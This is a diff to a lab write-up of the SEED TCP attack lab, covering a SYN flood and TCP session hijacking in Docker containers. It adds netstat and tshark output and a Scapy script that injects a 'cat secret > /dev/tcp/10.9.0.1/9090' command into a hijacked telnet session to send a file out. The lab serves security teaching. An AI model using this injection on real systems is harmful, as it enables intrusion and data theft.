@@ -93,6 +93,26 @@ The victim Docker container is thereby given the privilege to use `sysctl` to ch
 
 ### Task 1.1: Launch the Attack Using Python
 
+Inside the victim's shell, we can issue the `netstat` command to determine the destination port (`dport`) to which our SYN packets will be sent:
+
+```console
+[March 08 2023] seed@xingjian:~/Documents/TCPAttack$ docker-compose ps
+     Name                    Command               State   Ports
+----------------------------------------------------------------
+seed-attacker     /bin/sh -c /bin/bash             Up           
+user1-10.9.0.6    bash -c  /etc/init.d/openb ...   Up           
+user2-10.9.0.7    bash -c  /etc/init.d/openb ...   Up           
+victim-10.9.0.5   bash -c  /etc/init.d/openb ...   Up
+[March 08 2023] seed@xingjian:~/Documents/TCPAttack$ docksh victim-10.9.0.5
+root@5eec56c1372f:/# netstat -nat
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.11:38561        0.0.0.0:*               LISTEN     
+root@5eec56c1372f:/# exit
+exit
+```
+
 ```python
 #!/bin/env python3
 
@@ -114,13 +134,6 @@ while True:
 The above Python program sends out spoofed TCP SYN packets, with randomly generated source IP address, source port, and sequence number. Run this program for at least one minute and then try to `telnet` into the victim machine:
 
 ```console
-$ docker-compose ps
-     Name                    Command               State   Ports
-----------------------------------------------------------------
-seed-attacker     /bin/sh -c /bin/bash             Up           
-user1-10.9.0.6    bash -c  /etc/init.d/openb ...   Up           
-user2-10.9.0.7    bash -c  /etc/init.d/openb ...   Up           
-victim-10.9.0.5   bash -c  /etc/init.d/openb ...   Up
 $ docker exec -it seed-attacker /bin/bash
 root@ip-172-31-1-54:/# cd volumes
 root@ip-172-31-1-54:/volumes# touch synflood.py
@@ -134,8 +147,6 @@ Connected to 10.9.0.5.
 Escape character is '^]'.
 Ubuntu 20.04.1 LTS
 d19b63619cad login:
-Login timed out after 60 seconds.
-Connection closed by foreign host.
 ```
 
 After a while, our attack successfully broke into the victim's machine.
@@ -455,21 +466,58 @@ According to MDN Web Docs, the TCP session hijacking attack takes five steps:
 
 In this task, we need to demonstrate how we can hijack a `telnet` session between two computers. Our goal is to get the `telnet` server to run a malicious command from us. For the simplicity of the task, we assume that the attacker and the victim are on the same LAN.
 
-```python
-#!/usr/bin/env python3
-from scapy.all import *
+First, let's use `tshark` to capture packets between user 1 (`user1-10.9.0.6`) and the victim. In another terminal window, enter into the user 1's shell and `telnet` the victim's IP address. After logging in, issue the `netstat` command:
 
-ip   = IP(src="", dst="")
-tcp  = TCP(sport="", dport="", flags="A", seq=, ack=)
-data = ""
-pkt  = ip/tcp/data
-ls(pkt)
-send(pkt, verbose=0)
+```console
+seed@5eec56c1372f:~$ netstat -nta
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.11:38561        0.0.0.0:*               LISTEN     
+tcp        0      0 10.9.0.5:23             10.9.0.6:48662          ESTABLISHED
 ```
 
-## Task 4: Creating Reverse Shell using TCP Session Hijacking
+At the same time, we can see `tshark` printing out multiple lines of packet information:
 
-When attackers are able to inject a command to the victim's machine using TCP session hijacking, they are not interested in running one simple command on the victim machine; they are interested in running many commands. Obviously, running these commands all through TCP session hijacking is inconvenient. What attackers want to achieve is to use the attack to set up a back door, so they can use this back door to conveniently conduct further damages. A typical way to set up back doors is to run a reverse shell from the victim machine to give the attack the shell access to the victim machine. Reverse shell is a shell process running on a remote machine, connecting back to the attacker's machine. This gives an attacker a convenient way to access a remote machine once it has been compromised.
+```console
+...
+  116 235.910256731     10.9.0.6 → 10.9.0.5     TELNET 67 Telnet Data ...
+  117 235.910386009     10.9.0.5 → 10.9.0.6     TELNET 67 Telnet Data ...
+  118 235.910402316     10.9.0.6 → 10.9.0.5     TCP 66 48662 → 23 [ACK] Seq=1340333909 Ack=3134172352 Win=64128 Len=0 TSval=1776749336 TSecr=3880557648
+  119 236.150400115     10.9.0.6 → 10.9.0.5     TELNET 67 Telnet Data ...
+  120 236.150552808     10.9.0.5 → 10.9.0.6     TELNET 67 Telnet Data ...
+  121 236.150570702     10.9.0.6 → 10.9.0.5     TCP 66 48662 → 23 [ACK] Seq=1340333910 Ack=3134172353 Win=64128 Len=0 TSval=1776749576 TSecr=3880557888
+  122 236.415307544     10.9.0.6 → 10.9.0.5     TELNET 67 Telnet Data ...
+  123 236.415428473     10.9.0.5 → 10.9.0.6     TELNET 67 Telnet Data ...
+  124 236.415442987     10.9.0.6 → 10.9.0.5     TCP 66 48662 → 23 [ACK] Seq=1340333911 Ack=3134172354 Win=64128 Len=0 TSval=1776749841 TSecr=3880558153
+  125 236.608509387     10.9.0.6 → 10.9.0.5     TELNET 67 Telnet Data ...
+  126 236.608633947     10.9.0.5 → 10.9.0.6     TELNET 67 Telnet Data ...
+  127 236.608646896     10.9.0.6 → 10.9.0.5     TCP 66 48662 → 23 [ACK] Seq=1340333912 Ack=3134172355 Win=64128 Len=0 TSval=1776750034 TSecr=3880558346
+  128 236.695322363     10.9.0.6 → 10.9.0.5     TELNET 67 Telnet Data ...
+  129 236.695454590     10.9.0.5 → 10.9.0.6     TELNET 67 Telnet Data ...
+  130 236.695483888     10.9.0.6 → 10.9.0.5     TCP 66 48662 → 23 [ACK] Seq=1340333913 Ack=3134172356 Win=64128 Len=0 TSval=1776750121 TSecr=3880558433
+  131 236.889633744     10.9.0.6 → 10.9.0.5     TELNET 68 Telnet Data ...
+  132 236.891735810     10.9.0.5 → 10.9.0.6     TELNET 468 Telnet Data ...
+  133 236.891764815     10.9.0.6 → 10.9.0.5     TCP 66 48662 → 23 [ACK] Seq=1340333915 Ack=3134172758 Win=64128 Len=0 TSval=1776750318 TSecr=3880558630
+```
+
+Don't forget to use `ifconfig` or `ip addr` to find the network interface associated with the IP address `10.9.0.1`.
+
+```python
+#!/usr/bin/env python3
+
+# hijack.py
+from scapy.all import *
+
+ip   = IP(src="10.9.0.6", dst="10.9.0.5")
+tcp  = TCP(sport=48662, dport=23, flags="A", seq=1340333916, ack=3134172759)
+data = "\r cat secret > /dev/tcp/10.9.0.1/9090 \r"
+pkt  = ip/tcp/data
+ls(pkt)
+send(pkt, iface="br-16dcc04ec32d", verbose=0)
+```
+
+We can also launch the attack automatically as in the previous task.
 
 ## Notes
 
